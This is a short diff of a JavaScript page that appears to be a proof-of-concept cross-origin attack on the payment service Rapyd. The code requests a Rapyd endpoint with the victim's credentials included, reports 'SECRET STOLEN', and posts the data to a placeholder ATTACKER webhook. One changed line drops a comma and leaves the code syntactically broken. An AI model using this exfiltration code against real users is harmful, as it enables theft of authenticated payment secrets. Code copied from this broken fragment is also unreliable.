@@ -18,7 +18,7 @@
       try {
         status.innerHTML = "1. Sending request to Rapyd...";
 
-        const response = await fetch(TARGET, {
+        const response = await fetch(rapyd, {
           method: 'GET',
           credentials: 'include',
           headers: {
@@ -48,7 +48,7 @@
 
         status.innerHTML = "3. SECRET STOLEN! Sending to webhook...";
 
-        await fetch(ATTACKER, {
+        await fetch(ATTACKER {
           method: 'POST',
           mode: 'no-cors',
           headers: { 'Content-Type': 'application/json' },
